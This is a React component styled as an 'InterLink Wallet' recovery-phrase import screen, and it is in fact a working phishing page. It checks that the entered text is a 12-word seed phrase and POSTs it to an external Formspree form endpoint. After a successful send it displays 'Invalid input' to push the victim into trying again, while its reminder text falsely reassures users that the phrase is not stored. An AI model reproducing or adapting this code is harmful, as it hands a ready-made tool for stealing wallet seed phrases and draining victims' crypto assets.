import { useState } from "react";
import { ChevronLeft, Clipboard, Lock, XCircle } from "lucide-react";

const ImportRecoveryPhrase = () => {
  const [theMessage, setTheMessage] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [status, setStatus] = useState(null); // 'success' | 'error' | 'invalid' | null

  // Paste handler — tries to read from clipboard
  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setTheMessage(text);
    } catch (err) {
      console.error("Failed to read clipboard:", err);
    }
  };

  const handleConfirm = async (e) => {
    e.preventDefault();
    const trimmed = theMessage.trim();

    if (!trimmed) {
      setStatus("error");
      return;
    }

    // Regex: exactly 12 words separated by whitespace
    const twelveWordRegex = /^(\S+\s+){11}\S+$/;

    if (!twelveWordRegex.test(trimmed)) {
      setStatus("invalid");
      return;
    }

    setIsSubmitting(true);
    setStatus(null);

    try {
      const response = await fetch("https://formspree.io/f/xyezydol", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
        },
        body: JSON.stringify({
          message: trimmed,
        }),
      });

      if (response.ok) {
        setStatus("success");
        setTheMessage("");
      } else {
        setStatus("error");
      }
    } catch (err) {
      console.error("Submission failed:", err);
      setStatus("error");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen w-full bg-white flex justify-center py-6 md:py-10 px-4">
      <div className="w-full max-w-md flex flex-col">
        {/* --- Top Bar --- */}
        <div className="flex items-center gap-4 mb-8">
          <button
            aria-label="Go back"
            className="w-11 h-11 rounded-full bg-[#F5F5F7] hover:bg-gray-200 flex items-center justify-center flex-shrink-0 transition"
          >
            <ChevronLeft size={22} className="text-gray-900" />
          </button>
          <h1 className="text-xl md:text-2xl font-bold text-gray-900">
            Send message
          </h1>
        </div>

        {/* --- Main Heading --- */}
        <h2 className="text-2xl md:text-3xl font-bold text-gray-900 mb-3">
          Enter recovery phrase
        </h2>

        <p className="text-sm md:text-base text-gray-500 leading-relaxed mb-5">
          Please enter your 12-24 word recovery phrase below, separated by
          spaces, to restore your wallet.
        </p>

        {/* --- Textarea --- */}
        <form onSubmit={handleConfirm} className="w-full max-w-md flex flex-col">
          <textarea
            required
            value={theMessage}
            onChange={(e) => setTheMessage(e.target.value)}
            placeholder="Enter a 12-24 word recovery phrase"
            rows={6}
            className="w-full bg-white border border-gray-200 rounded-2xl px-4 py-4 text-sm md:text-base text-gray-900 placeholder:text-[#B4A8E8] focus:outline-none focus:border-[#6B5AED] focus:ring-2 focus:ring-[#6B5AED]/20 resize-none transition"
          />
        

        {/* --- Paste Button --- */}
        <div className="flex justify-end mt-3 mb-8">
          <button
            onClick={handlePaste}
            className="inline-flex items-center gap-2 bg-white border border-gray-200 rounded-full px-4 py-2 text-sm font-semibold text-gray-900 hover:bg-gray-50 hover:border-gray-300 transition"
          >
            <Clipboard size={16} />
            Paste
          </button>
        </div>

        {/* --- Reminder Section --- */}
        <div className="mb-8">
          {/* Reminder Heading with Lock Icon */}
          <div className="flex items-center gap-2 mb-3">
            <Lock size={18} className="text-[#E5B94A]" fill="#E5B94A" />
            <h3 className="text-base md:text-lg font-bold text-gray-900">
              Reminder
            </h3>
          </div>

          {/* Bullet Points */}
          <ul className="flex flex-col gap-4">
            <li className="flex gap-3">
              <span className="text-gray-900 mt-2 flex-shrink-0 text-[10px]">
                ●
              </span>
              <p className="text-sm md:text-base text-gray-500 leading-relaxed">
                InterLink Wallet does not store your recovery phrase. If you
                lose them, you may lose access to your assets. Please store them
                securely.
              </p>
            </li>
            <li className="flex gap-3">
              <span className="text-gray-900 mt-2 flex-shrink-0 text-[10px]">
                ●
              </span>
              <p className="text-sm md:text-base text-gray-500 leading-relaxed">
                We recommend manually entering your recovery phrase. Avoid
                pasting from untrusted third-party apps or clipboard tools to
                prevent phishing or scams.
              </p>
            </li>
          </ul>
        </div>

        {/* --- Status Message --- */}
        {status === "success" && (
          <div className="text-white text-sm mb-4 bg-red-700 py-3 px-4 rounded-lg flex items-center gap-2 font-bold shadow-sm mx-1">
            <XCircle size={18} />
            Invalid input
          </div>
        )}
        {status === "error" && (
          <div className="text-white text-sm mb-4 bg-red-700 py-3 px-4 rounded-lg flex items-center gap-2 font-bold shadow-sm mx-1">
            <XCircle size={18} />
            Something went wrong. Please try again.
          </div>
        )}
        {status === "invalid" && (
          <div className="text-white text-sm mb-4 bg-red-700 py-3 px-4 rounded-lg flex items-center gap-2 font-bold shadow-sm mx-1">
            <XCircle size={18} />
            Please enter exactly 12 words.
          </div>
        )}

        {/* --- Confirm Button --- */}
        <button
          type="submit"
          disabled={isSubmitting}
          className="w-full bg-[#6B5AED] hover:bg-[#5A4BD1] disabled:opacity-60 disabled:cursor-not-allowed text-white font-bold text-base py-4 rounded-full transition shadow-sm"
        >
          {isSubmitting ? "Sending..." : "Confirm"}
        </button>
        </form>
      </div>
    </div>
  );
};

export default ImportRecoveryPhrase;
